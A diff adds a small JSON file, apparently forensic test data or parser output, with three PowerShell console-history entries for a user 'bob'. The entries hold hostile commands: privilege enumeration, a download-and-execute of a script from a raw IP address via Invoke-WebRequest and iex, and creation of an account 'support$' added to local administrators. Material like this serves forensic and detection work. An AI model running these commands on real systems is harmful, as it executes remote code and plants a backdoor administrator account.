@@ -1,0 +1,23 @@
+[
+ {
+  "user": "bob",
+  "file": "...ConsoleHost_history.txt",
+  "line": 1,
+  "command": "whoami /priv",
+  "timestamp": "2026-11-03T09:12:00+00:00"
+ },
+ {
+  "user": "bob",
+  "file": "...ConsoleHost_history.txt",
+  "line": 2,
+  "command": "Invoke-WebRequest http://185.220.101.47/p.ps1 -OutFile p.ps1; iex (gc p.ps1 -raw)",
+  "timestamp": "2026-11-03T09:12:30+00:00"
+ },
+ {
+  "user": "bob",
+  "file": "...ConsoleHost_history.txt",
+  "line": 3,
+  "command": "net user support$ P@ss! /add; net localgroup administrators support$ /add",
+  "timestamp": "2026-11-03T09:20:00+00:00"
+ }
+]
